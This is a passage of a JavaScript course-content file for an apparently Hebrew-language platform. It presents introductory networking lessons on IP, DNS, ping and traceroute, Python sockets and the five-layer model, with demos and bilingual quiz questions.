// ===== TRACKS =====
// Each track is a self-contained learning path with its own chapters.
// Chapter IDs: Networking=1-99, Cyber=101-199, DevOps=201-299, Research=301-399

export const tracks = [
  {
    id: 'networking',
    title: 'רשתות מחשבים',
    subtitle: 'TCP/IP, DNS, HTTP ועוד 26 פרקים מרשתות בסיס עד BGP',
    icon: '🌐',
    color: '#0891b2',
    level: 'מתחיל–מתקדם',
    chapters: [

  {
    id: 1,
    title: "תחילת מסע - איך עובד האינטרנט?",
    pages: [
      {
        type: "explanation",
        title: "מה קורה כשאנו גולשים לאתר?",
        content: `
          <p>רובנו גלשנו ל־<code>Facebook</code>.</p>
          <p>אבל מה בעצם קורה מאחורי הקלעים?</p>
          <p>מקישים בדפדפן את הכתובת <code>www.facebook.com</code>, לוחצים Enter — ומקבלים את המידע.</p>
          <p><strong>אתר זקוק לארבעה דברים כדי לתפקד:</strong></p>
          <ul>
            <li><strong>אחסון</strong> — מקום לדפי האתר</li>
            <li><strong>עיצוב</strong> — לוגו, מיקום אלמנטים</li>
            <li><strong>אימות</strong> — זיהוי משתמשים</li>
            <li><strong>תקשורת</strong> — דרך לתקשר עם האתר מכל מקום בעולם</li>
          </ul>
          <p>ספר זה מתמקד בתקשורת.</p>
          <p>נלמד כיצד מידע עובר בין רכיבים אלקטרוניים.</p>
        `
      },
      {
        type: "explanation",
        title: "WWW – World Wide Web",
        content: `
          <p><strong>WWW</strong> — <code>World Wide Web</code></p>
          <p>כשאנו אומרים "אינטרנט", אנו מתכוונים בדרך כלל לאוסף עמודי האינטרנט אליהם גולשים בדפדפן.</p>
          <p>המילה <code>Web</code> משמעה רשת — עמודי האינטרנט מקושרים זה לזה כמו קורי עכביש.</p>
          <p><strong>בקשה</strong> — <code>Request</code></p>
          <p>הדפדפן שולח בקשה אל השרת — "שלח לי את המידע הנדרש".</p>
          <p><strong>תגובה</strong> — <code>Response</code></p>
          <p>השרת משיב בתגובה שמכילה את המידע הדרוש.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 400 140" class="content-diagram">
              <rect x="30" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="75" y="50" text-anchor="middle" font-size="12" fill="var(--text)">לקוח</text>
              <text x="75" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(דפדפן)</text>
              <path d="M 125 50 L 175 50" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrow)"/>
              <text x="150" y="40" text-anchor="middle" font-size="9" fill="var(--accent-green)">בקשה</text>
              <path d="M 275 50 L 225 50" stroke="var(--accent-gold)" stroke-width="2" marker-end="url(#arrow2)"/>
              <text x="250" y="40" text-anchor="middle" font-size="9" fill="var(--accent-gold)">תגובה</text>
              <rect x="280" y="20" width="90" height="60" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="2"/>
              <text x="325" y="50" text-anchor="middle" font-size="12" fill="var(--text)">שרת</text>
              <text x="325" y="65" text-anchor="middle" font-size="10" fill="var(--text-muted)">(אתר)</text>
              <defs><marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker>
              <marker id="arrow2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-gold)"/></marker></defs>
            </svg>
            <p class="diagram-caption">תרשים: תקשורת לקוח-שרת</p>
          </div>
          <p>האתר מקבל בקשות ושולח תגובות — הוא מספק שירות.</p>
          <p><strong>שרת</strong> — <code>Server</code></p>
          <p>האתר הוא השרת.</p>
          <p><strong>לקוח</strong> — <code>Client</code></p>
          <p>הדפדפן הוא הלקוח.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: מה השרת שולח ללקוח",
        content: `
          <p>כשבוחרים <code>View page source</code> באתר, רואים את הקוד שהשרת שלח.</p>
          <p><strong>דוגמה:</strong> זה מה שהשרת מחזיר:</p>
          <div class="code-preview">
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang="he"&gt;
&lt;head&gt;
  &lt;title&gt;עמוד ראשי - Ynet&lt;/title&gt;
  &lt;meta charset="UTF-8"&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;כותרת ראשית של העמוד&lt;/h1&gt;
  &lt;p&gt;טקסט שמציגים למשתמש...&lt;/p&gt;
  &lt;img src="/images/photo.jpg" alt="תמונה"&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
          </div>
          <div class="demo-note">
            <p>📋 זה מה שמופיע בחלון "מקור הדף":</p>
            <ul>
              <li>תיאור מיקום כל אלמנט בעמוד</li>
              <li>אילו תמונות יש</li>
              <li>מה הכותרת</li>
            </ul>
            <p>הדפדפן קורא את הקוד הזה ובונה ממנו את העמוד שרואים.</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "כתובות IP",
        content: `
          <p>כדי לשלוח ולקבל הודעות באינטרנט, צריך לדעת לאן לשלוח.</p>
          <p>כמו במכתב — מציינים על המעטפה כתובת יעד וכתובת מקור.</p>
          <p><strong>כתובות <code>IP</code></strong></p>
          <p>באינטרנט, הכתובות נקראות כתובות <code>IP</code>.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 70" class="content-diagram">
              <rect x="10" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 1</text>
              <text x="45" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <line x1="85" y1="35" x2="95" y2="35" stroke="var(--text-muted)"/>
              <rect x="100" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="135" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 2</text>
              <text x="135" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <line x1="175" y1="35" x2="185" y2="35" stroke="var(--text-muted)"/>
              <rect x="190" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="225" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 3</text>
              <text x="225" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <line x1="265" y1="35" x2="275" y2="35" stroke="var(--text-muted)"/>
              <rect x="280" y="15" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="315" y="38" text-anchor="middle" font-size="11" fill="var(--text)">בית 4</text>
              <text x="315" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">0-255</text>
              <text x="170" y="65" text-anchor="middle" font-size="12" fill="var(--accent)">192 . 168 . 1 . 105</text>
            </svg>
            <p class="diagram-caption">מבנה כתובת <code>IPv4</code> – ארבעה בתים מופרדים בנקודה</p>
          </div>
          <p>כתובות <code>IP</code> מורכבות מארבעה בתים.</p>
          <p>כל בית בטווח 0–255, מופרדים בנקודה.</p>
          <p><strong>דוגמה:</strong></p>
          <ul>
            <li><code>1.2.3.4</code></li>
            <li><code>192.168.1.1</code></li>
            <li><code>31.13.72.65</code> — כתובת <code>Facebook</code></li>
          </ul>
          <p>הודעת הבקשה מהדפדפן מכילה בכתובת המקור את כתובת ה־<code>IP</code> של המחשב.</p>
          <p>בכתובת היעד — כתובת ה־<code>IP</code> של האתר.</p>
          <p>בהודעת התגובה — ההפך.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של פקודת ping",
        content: `
          <p>כשרצים <code>ping www.facebook.com</code>, זה הפלט שמופיע:</p>
          <div class="code-preview">
            <pre><code>C:\&gt; ping www.facebook.com

Pinging facebook.com [31.13.72.65] with 32 bytes of data:
Reply from 31.13.72.65: bytes=32 time=45ms TTL=56
Reply from 31.13.72.65: bytes=32 time=42ms TTL=56</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>בשורה <code>Pinging facebook.com [31.13.72.65]</code> — המספר בסוגריים המרובעים הוא כתובת ה־<code>IP</code> של <code>Facebook</code></li>
              <li><code>ping</code> שולח בקשת הד — <code>Echo Request</code> — ומקבל תשובה</li>
              <li>השדה <code>time</code> מציג את זמן התגובה במילישניות</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "ענן האינטרנט",
        content: `
          <p>המחשב שלנו לא מחובר ישירות לאתר <code>Facebook</code>.</p>
          <p>הוא מחובר לרכיב שמוצא את דרכו לרכיבים אחרים — רשת של רכיבים שמעבירים את ההודעה מהמחשב ועד לשרת היעד.</p>
          <p>כל חץ בין רכיבים מייצג תקשורת בשכבת הקו.</p>
        `
      },
      {
        type: "explanation",
        title: "traceroute – מסלול ההודעה",
        content: `
          <p><strong><code>traceroute</code></strong></p>
          <p>כלי שמציג את הדרך שעוברת הודעה מהמחשב שלנו אל היעד.</p>
          <p>כל שורה בפלט מייצגת רכיב אחד — נתב או שרת — שהחבילה עברה דרכו.</p>
          <p>כל צעד כזה נקרא <code>hop</code>.</p>
          <p>כלי ויזואלי: <code>Visual Traceroute</code> באתר <a href="http://yougetsignal.com/tools/visual-tracert" target="_blank">yougetsignal.com</a>.</p>
          <p>מציג את המסלול על מפת העולם.</p>
        `
      },
      {
        type: "explanation",
        title: "DNS – מתרגם שם ל-IP",
        content: `
          <p><strong><code>DNS</code></strong> — <code>Domain Name System</code></p>
          <p>מערכת שמתרגמת שמות דומיין לכתובות <code>IP</code>.</p>
          <p>דוגמה: השם <code>www.facebook.com</code> מתורגם לכתובת <code>IP</code> מספרית.</p>
          <p>הפקודה <code>nslookup www.facebook.com</code> שולחת שאילתת <code>DNS</code> ומציגה את כתובת ה־<code>IP</code>.</p>
        `
      },
      {
        type: "simulation",
        title: "הדמיית DNS – תרגום דומיין ל־IP",
        simId: "dnsLookup",
        content: `<p>הדמיה של תהליך ה־<code>DNS</code>: הכניסו דומיין (למשל google.com) ולחצו "חפש <code>IP</code>" – המדריך מדגים את הזרימה.</p>`
      },
      {
        type: "simulation",
        title: "הדמיית מסלול חבילה ברשת",
        simId: "packetFlow",
        content: `<p>לחצו "הרץ מסלול" כדי לראות איך חבילה עוברת ממחשב דרך <code>Switch</code> ונתבים עד לשרת – כל צעד בנפרד.</p>`
      },
      {
        type: "explanation",
        title: "GeoIP – מיקום גיאוגרפי",
        content: `
          <p><strong><code>GeoIP</code></strong> — מיקום גיאוגרפי לפי כתובת <code>IP</code></p>
          <p>ישנם מאגרי נתונים הכוללים מידע על המיקום הגיאוגרפי של כתובות <code>IP</code>.</p>
          <p>בהינתן כתובת <code>IP</code>, ניתן לדעת באיזו מדינה ועיר היא נמצאת.</p>
          <p>המיפוי אינו רשמי ולא מדויק, אך נותן מענה נכון ברוב המקרים.</p>
          <p><strong>דוגמה:</strong> <a href="http://www.geoiptool.com" target="_blank">geoiptool.com</a></p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – פרק 1",
        intro: "<p>כדי להעמיק – שאלות מפתיעות ותשובות יצירתיות:</p>",
        blocks: [
          {
            title: "למה דווקא 255? למה 65535 פורטים?",
            icon: "🔢",
            content: `
              <p><strong>255</strong> = 2^8 − 1</p>
              <p>בית אחד מכיל 8 ביטים — כלומר 256 ערכים אפשריים — 0 עד 255.</p>
              <p>כתובת <code>IPv4</code> מורכבת מ־4 בתים.</p>
              <p><strong>65535</strong> = 2^16 − 1</p>
              <p>מספר פורט מיוצג על ידי 16 ביטים.</p>
              <p>לכן הטווח הוא 0 עד 65535.</p>
              <p>הרשת בנויה על כוחו של הבינארי — כל ביט מכפיל את מספר האפשרויות.</p>
            `
          },
          {
            title: "IP over Avian Carriers – אינטרנט עם יונים",
            icon: "🕊️",
            content: `
              <p><strong>RFC 1149</strong> — <code>IP over Avian Carriers</code></p>
              <p>תקן אמיתי משנת 1990 — העברת חבילות <code>IP</code> באמצעות יונים.</p>
              <p>באפריל 2001 בוצע ניסוי אמיתי בנורווגיה על ידי <code>Bergen Linux User Group</code>:</p>
              <ul>
                <li>שוגרו 9 יונות</li>
                <li>4 חבילות הגיעו, 5 אבדו — <code>packet loss</code> של כ־56%</li>
                <li>זמן תגובה ממוצע: 3,000 שניות (כ־50 דקות)</li>
              </ul>
              <p>המסקנה: פרוטוקול הוא רק "שפה" — ההעברה הפיזית יכולה להיות כל דבר. אפילו יונים.</p>
            `
          },
          {
            title: "מה קורה כשחבילה הולכת לאיבוד?",
            icon: "❓",
            content: `
              <p><strong>ב־<code>TCP</code></strong></p>
              <p>השולח לא מקבל <code>ACK</code>, מחכה עד שפג הזמן — <code>timeout</code> — ושולח שוב.</p>
              <p><strong>ב־<code>UDP</code></strong></p>
              <p>אף אחד לא שם לב.</p>
              <p>היישום אולי יבחין בבעיה — סרטון שקופץ, שיחה שנקטעת — ואולי לא.</p>
              <p>הרשת לא "יודעת" מה חשוב — רק הפרוטוקולים והיישומים מחליטים.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 1",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>מודל לקוח-שרת: הדפדפן שולח בקשה, השרת מחזיר תגובה</li>
              <li>כתובות <code>IP</code> מזהות מחשבים — 4 בתים, 0–255</li>
              <li><code>ping</code> — בדיקת חיבור, מציאת <code>IP</code>. <code>traceroute</code> — מסלול החבילות</li>
              <li><code>DNS</code> מתרגם שם דומיין — <code>www.facebook.com</code> — ל־<code>IP</code>. <code>nslookup</code> — שאילתת <code>DNS</code></li>
              <li><code>GeoIP</code> — מיפוי <code>IP</code> למיקום גיאוגרפי — לא מדויק</li>
            </ul>
          </div>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של nslookup",
        content: `
          <p>כשרצים <code>nslookup www.google.com</code>, זה סוג הפלט:</p>
          <div class="code-preview">
            <pre><code>C:\&gt; nslookup www.google.com

Non-authoritative answer:
Name:    www.google.com
Addresses:  142.250.185.46
            2a00:1450:4010:c08::8b</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>הכתובת הראשונה היא <code>IPv4</code>, השנייה היא <code>IPv6</code></li>
              <li><code>Non-authoritative</code> — תשובה משרת מטמון, לא משרת ה־<code>DNS</code> הראשי של הדומיין</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 1",
        titleEn: "Chapter 1 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין לקוח לשרת?",
            a: "הלקוח — Client — שולח בקשות, למשל הדפדפן שמבקש דף אינטרנט. השרת — Server — מקבל את הבקשות ומחזיר תגובות, למשל אתר Facebook ששולח את תוכן הדף.",
            qEn: "What is the difference between a client and a server?",
            aEn: "The client sends requests, for example a browser asking for a web page. The server receives requests and sends back responses, for example Facebook sending the page content."
          },
          {
            q: "איך נראה כתובת IP ומה המבנה שלה?",
            a: "כתובת IP מורכבת מארבעה מספרים — בתים — מופרדים בנקודות. כל מספר בטווח 0–255. דוגמאות: 192.168.1.1, 31.13.72.65.",
            qEn: "What does an IP address look like and what is its structure?",
            aEn: "An IP address is made of four numbers (bytes) separated by dots. Each number is in the range 0-255. Examples: 192.168.1.1, 31.13.72.65."
          },
          {
            q: "מה עושה traceroute ולמה הוא שימושי?",
            a: "traceroute מציג את מסלול החבילות מהמחשב ליעד – כל נתב ושרת בדרך. שימושי לאבחון עיכובים, זיהוי מקום תקלה, והבנת איך הרשת בנויה.",
            qEn: "What does traceroute do and why is it useful?",
            aEn: "traceroute shows the path of packets from your computer to the destination — every router and server along the way. It is useful for diagnosing delays, finding where a problem is, and understanding how the network is built."
          },
          {
            q: "איך DNS עובד? למה הדפדפן לא יכול פשוט להשתמש בשם?",
            a: "הרשת עובדת עם כתובות IP – מספרים. DNS הוא פנקס טלפונים שמתרגם שמות קריאים (www.google.com) למספרים. הדפדפן שולח שאילתה לשרת DNS, שמחזיר את ה-IP.",
            qEn: "How does DNS work? Why can't the browser just use the name?",
            aEn: "The network works with IP addresses — numbers. DNS is a phone book that translates readable names (www.google.com) to numbers. The browser sends a query to a DNS server, which returns the IP."
          }
        ]
      }
    ]
  },
  {
    id: 2,
    title: "תכנות ב-Sockets",
    pages: [
      {
        type: "explanation",
        title: "מהו Socket?",
        content: `
          <p><strong><code>Socket</code></strong></p>
          <p>ממשק שמאפשר לתקשר בין שני מחשבים.</p>
          <p>כמתוכנתים, כל מה שצריך הוא: כתובת המחשב המרוחק, הפורט שעליו הוא מאזין, והתחברות.</p>
          <p>ה־<code>Socket</code> מפשט את כל תהליך התקשורת שקורה בפועל ברשת.</p>
          <p>בפרק זה נלמד ליצור שרת ולקוח בפייתון באמצעות <code>Sockets</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "מודל שרת-לקוח ב-Sockets",
        content: `
          <p>ניתן לדמות את התקשורת לשליחת מכתב בין שתי משפחות בבניין רב קומות.</p>
          <p><strong>כתובת ה־<code>IP</code></strong> — מזהה הבניין — מזהה הרכיב.</p>
          <p><strong>הפורט</strong> — 0–65535 — מזהה הדירה — מזהה התוכנה.</p>
          <p>השרת מאזין על פורט מסוים ומחכה לחיבורים.</p>
          <p>הלקוח מתחבר לכתובת ולפורט, ושולח ומקבל הודעות.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: קוד לקוח בפייתון",
        content: `
          <p>זה הקוד המלא ללקוח שמתחבר, שולח שם ומקבל תשובה:</p>
          <div class="code-preview">
            <pre><code>import socket

my_socket = socket.socket()
my_socket.connect(('1.2.3.4', 8820))
my_socket.send(b'Omer')          # bytes, לא string!
data = my_socket.recv(1024)
print('The server sent:', data.decode())
my_socket.close()</code></pre>
          </div>
          <div class="demo-note">
            <p>📋 <strong>הסבר הפונקציות:</strong></p>
            <ul>
              <li><code>socket()</code> — יוצר אובייקט socket</li>
              <li><code>connect()</code> — מתחבר ל־<code>IP</code>:<code>Port</code></li>
              <li><code>send()</code> — שולח bytes (חובה <code>b'...'</code>, לא string)</li>
              <li><code>recv()</code> — מקבל נתונים — <code>blocking</code> — עוצר עד לקבלת מידע</li>
              <li><code>decode()</code> — ממיר bytes לטקסט</li>
              <li><code>close()</code> — משחרר משאבים</li>
            </ul>
            <p><code>127.0.0.1</code> = התחברות למחשב עצמו — <code>loopback</code>.</p>
          </div>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: קוד שרת בפייתון",
        content: `
          <p>זה המבנה הבסיסי של שרת:</p>
          <div class="code-preview">
            <pre><code>import socket

server_socket = socket.socket()
server_socket.bind(('0.0.0.0', 8820))
server_socket.listen(1)
(client_socket, client_address) = server_socket.accept()
data = client_socket.recv(1024).decode()   # bytes → string
client_socket.send(('Hello ' + data).encode())  # string → bytes
client_socket.close()
server_socket.close()</code></pre>
          </div>
          <div class="demo-note">
            <p>📋 <strong>הסבר הפונקציות:</strong></p>
            <ul>
              <li><code>bind()</code> — מקשיר את השרת ל־<code>IP</code> ולפורט</li>
              <li><code>listen()</code> — מתחיל להאזין לחיבורים</li>
              <li><code>accept()</code> — מחכה לחיבור — <code>blocking</code> — ומחזיר <code>socket</code> של הלקוח וכתובתו</li>
              <li><code>recv()</code> — מקבל <code>bytes</code>. <code>decode()</code> ממיר לטקסט. מחזיר <code>b''</code> ריק אם הלקוח התנתק</li>
              <li><code>send()</code> — שולח bytes. <code>encode()</code> ממיר מטקסט ל־bytes</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "שרת הדים ושרת פקודות",
        content: `
          <p><strong>שרת הדים</strong> — <code>Echo</code></p>
          <p>מחזיר ללקוח בדיוק את ההודעה שקיבל.</p>
          <p>דוגמה: הלקוח שולח <code>"Omer"</code> — השרת מחזיר <code>"Omer"</code>.</p>

          <p><strong>שרת שם + ברכה</strong></p>
          <p>מקבל שם מהלקוח ומחזיר ברכה.</p>
          <p>דוגמה: הלקוח שולח <code>"Omer"</code> — השרת מחזיר <code>"Hello Omer"</code>.</p>

          <p><strong>שרת פקודות</strong></p>
          <p>מקבל פקודה מהלקוח ומבצע פעולה בהתאם.</p>
          <p>דוגמה: הלקוח שולח <code>"SCREENSHOT"</code> — השרת מצלם מסך ומחזיר את התוצאה.</p>

          <p><strong>אופן העבודה</strong></p>
          <p>השרת מטפל בלקוח אחד בכל פעם:</p>
          <ul>
            <li><code>accept</code> — עוצר ומחכה עד שמגיע חיבור חדש</li>
            <li><code>recv</code> — עוצר ומחכה עד שמגיע מידע מהלקוח</li>
          </ul>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 2",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Socket</code> = ממשק לתקשורת בין מחשבים — <code>bind</code>, <code>listen</code>, <code>accept</code>, <code>recv</code>, <code>send</code></li>
              <li>לקוח: <code>connect</code>, <code>send</code>, <code>recv</code> — <code>blocking</code>. שרת: <code>bind</code>, <code>listen</code>, <code>accept</code></li>
              <li><code>127.0.0.1</code> = <code>loopback</code>. שרת הדים, שרת פקודות</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "127.0.0.1 ו־0.0.0.0",
        content: `
          <p><strong>127.0.0.1</strong> — <code>loopback</code></p>
          <p>כתובת שמפנה למחשב עצמו.</p>
          <p>משמשת להתחברות לשרת שרץ על אותו מחשב.</p>

          <p><strong>0.0.0.0</strong> בפקודת <code>bind</code></p>
          <p>משמעות: "האזן על כל הממשקים".</p>
          <p>השרת מקבל חיבורים מכל כתובת <code>IP</code> של המחשב, כולל <code>127.0.0.1</code> וממשק הרשת החיצוני.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 2",
        titleEn: "Chapter 2 — Comprehension Questions",
        questions: [
          {
            q: "מה תפקיד הפורט בהקשר של Socket?",
            a: "הפורט מזהה את התוכנה הספציפית על השרת. שרת אחד יכול להריץ כמה שירותים – אימייל, HTTP וכו'. כל שירות מאזין על פורט אחר, כך שהשרת יודע להפנות את הבקשה לתוכנה הנכונה.",
            qEn: "What is the role of a port in the context of a Socket?",
            aEn: "The port identifies the specific program on the server. One server can run multiple services — email, HTTP, etc. Each service listens on a different port, so the server knows which program should handle the request."
          },
          {
            q: "מה ההבדל בין bind ל־connect?",
            a: "bind — קושר את ה־Socket לכתובת ופורט — לשרת — 'אני מאזין כאן'. connect — מתחבר לכתובת ופורט מרוחקים — ללקוח — 'אני מתחבר אליך'.",
            qEn: "What is the difference between bind and connect?",
            aEn: "bind ties the Socket to an address and port — used by the server — 'I am listening here'. connect connects to a remote address and port — used by the client — 'I am connecting to you'."
          },
          {
            q: "למה recv ו-accept נקראים blocking?",
            a: "הם עוצרים את הביצוע עד שמשהו קורה — accept עד שחיבור חדש מגיע, recv עד שמידע מגיע. אם לא יגיע כלום — התוכנה תישאר תקועה — עד timeout אם הוגדר.",
            qEn: "Why are recv and accept called blocking?",
            aEn: "They stop the program until something happens — accept waits until a new connection arrives, recv waits until data arrives. If nothing comes, the program stays stuck — until a timeout if one was set."
          }
        ]
      }
    ]
  },
  {
    id: 3,
    title: "Wireshark ומודל חמש השכבות",
    pages: [
      {
        type: "explanation",
        title: "מה קורה כשאנחנו מתקשרים?",
        content: `
          <p>ב־<code>Sockets</code> היה לנו נוח — לא ראינו מה באמת עובר ברשת.</p>
          <p><strong><code>Wireshark</code></strong></p>
          <p>כלי שמאפשר לחקור את המידע שיוצא ונכנס בכרטיס הרשת.</p>
          <p>רואים בדיוק מה עובר כשמדברים עם מחשב מרוחק.</p>
          <p>בפרק זה נציג גם את <strong>מודל חמש השכבות</strong> — מודל לוגי שמחלק את פעולות מערכת התקשורת לחמישה חלקים.</p>
        `
      },
      {
        type: "explanation",
        title: "למה צריך מודל שכבות?",
        content: `
          <p>העברת מידע בין רכיבי האינטרנט — מחשבים, שרתים, נתבים — היא משימה מורכבת.</p>
          <p>ארגון התקינה הבינלאומי — <code>ISO</code> — יצר את <strong>מודל שבע השכבות</strong> — <code>OSI</code> — כדי לארגן את כל זה.</p>
          <p>בספר משתמשים ב־<strong>מודל חמש השכבות</strong> — דומה ל־<code>OSI</code>, אך ללא שתי שכבות שהתגלו כמיותרות.</p>
          <p>המודל מנחה כיצד צריכה להיראות תקשורת, ללא תלות ביצרן החומרה.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: אנלוגיה – טיסה בשדה תעופה",
        content: `
          <div class="demo-flow">
            <p>דוגמה להבנת שכבות – אדם שעובר משדה תעופה במדינת המקור למדינת היעד:</p>
            <ol class="demo-steps">
              <li><strong>שכבת מזוודות</strong> – הפקדה/קבלה של מטען</li>
              <li><strong>שכבת דרכונים</strong> – החתמה יוצאת/נכנסת</li>
              <li><strong>שכבת שערים</strong> – עלייה/ירידה מהמטוס</li>
              <li><strong>שכבת טיסה</strong> – העברה פיזית בין המדינות</li>
            </ol>
            <p>כל שכבה מספקת שירות לשכבות שמעליה, ולא תלויה במימוש השכבות מתחתיה. אם יחליפו דרכונים אלקטרוניים – שאר התחנות לא מושפעות.</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "מודל חמש השכבות – סקירה",
        content: `
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 280 200" class="content-diagram layers-diagram">
              <rect x="10" y="10" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="28" font-size="11" fill="var(--text)">5. אפליקציה</text><text x="200" y="28" font-size="9" fill="var(--text-muted)">HTTP, DNS</text>
              <rect x="10" y="45" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="63" font-size="11" fill="var(--text)">4. תעבורה</text><text x="200" y="63" font-size="9" fill="var(--text-muted)">TCP, UDP</text>
              <rect x="10" y="80" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="98" font-size="11" fill="var(--text)">3. רשת</text><text x="200" y="98" font-size="9" fill="var(--text-muted)">IP</text>
              <rect x="10" y="115" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="133" font-size="11" fill="var(--text)">2. קו</text><text x="200" y="133" font-size="9" fill="var(--text-muted)">Ethernet</text>
              <rect x="10" y="150" width="260" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="20" y="168" font-size="11" fill="var(--text)">1. פיזית</text><text x="200" y="168" font-size="9" fill="var(--text-muted)">כבלים, אותות</text>
              <path d="M 140 10 L 140 180" stroke="var(--accent)" stroke-dasharray="4,4" opacity="0.5"/>
            </svg>
            <p class="diagram-caption">מודל חמש השכבות</p>
          </div>
          <p>השכבות (מלמעלה למטה):</p>
          <ul>
            <li><strong>5. אפליקציה</strong> — פרוטוקולי היישומים — <code>HTTP</code>, <code>DNS</code> וכו'</li>
            <li><strong>4. תעבורה</strong> — <code>TCP</code>, <code>UDP</code> — העברת מידע בין תהליכים</li>
            <li><strong>3. רשת</strong> — <code>IP</code> — ניתוב חבילות בין רכיבי הרשת</li>
            <li><strong>2. קו</strong> — <code>Ethernet</code> וכו' — העברה מקומית בין צומתים</li>
            <li><strong>1. פיזית</strong> — אותות, כבלים, אותות אלחוטיים</li>
          </ul>
          <p>כל שכבה מדברת רק עם השכבות הסמוכות אליה.</p>
          <p>המידע עובר מלמעלה למטה — בשליחה — ומלמטה למעלה — בקבלה.</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול – הגדרה",
        content: `
          <p><strong>פרוטוקול</strong></p>
          <p>סט חוקים שמגדיר כיצד צריכה להיראות התקשורת.</p>
          <p>אפשר לחשוב על פרוטוקול כמו שפה — הוא קובע כללי תחביר ואוצר מילים.</p>
          <p>בלי פרוטוקולים, כל רכיב ידבר "שפה" משלו — כמו מגדל בבל.</p>
          <p>דוגמה: <code>HTTP</code> קובע איך הדפדפן ידבר עם השרת.</p>
        `
      },
      {
        type: "explanation",
        title: "Encapsulation ו-Decapsulation",
        content: `
          <p><strong><code>Encapsulation</code></strong> — כימוס — בשליחה</p>
          <p>כל שכבה מקבלת מהשכבה שמעליה את הפקטה, מוסיפה <code>Header</code> בתחילתה, ומעבירה לשכבה שמתחת.</p>
          <p><strong><code>Decapsulation</code></strong> — בקבלה</p>
          <p>השכבה התחתונה מקבלת את הפקטה, מקלפת את ה־<code>Header</code> שלה, ומעבירה את ה־<code>Data</code> לשכבה שמעל.</p>
          <p>ה־<code>Header</code> שכל שכבה מוסיפה מכיל: כתובת, בקרת שגיאות ועוד.</p>
        `
      },
      {
        type: "simulation",
        title: "הדמיית Encapsulation / Decapsulation",
        simId: "encapsulation",
        content: `<p>לחצו על "<code>Encapsulation</code>" כדי לראות איך כל שכבה מוסיפה <code>Header</code> בשליחה. לחצו "<code>Decapsulation</code>" לראות איך מקלפים בקבלה.</p>`
      },
      {
        type: "explanation",
        title: "מבנה הפקטה – כל שכבה מוסיפה Header",
        content: `
          <p>הפקטה בנויה משכבות, כל אחת עוטפת את הקודמת:</p>
          <p><code>Ethernet Header</code> + <code>IP Header</code> + <code>TCP Header</code> + <code>Data</code></p>
          <p>ה־<code>Data</code> של שכבה n הוא הפקטה המלאה של שכבה n+1, כולל ה־<code>Header</code> שלה.</p>
          <p>בשכבת הקו יש גם <code>Trailer</code> בסוף המסגרת.</p>
          <p><strong><code>Wireshark</code></strong> מציג את המבנה הזה לפי שכבות.</p>
          <p>אפשר להשתמש במסננים כדי לסנן לפי פרוטוקול.</p>
          <p>לדוגמה: <code>http</code> או <code>dns</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "פירוט כל שכבה – שירותים",
        content: `
          <div class="layers-detail">

            <div class="layer-card lc-5">
              <div class="lc-info">
                <div class="lc-num">5</div>
                <div class="lc-text">
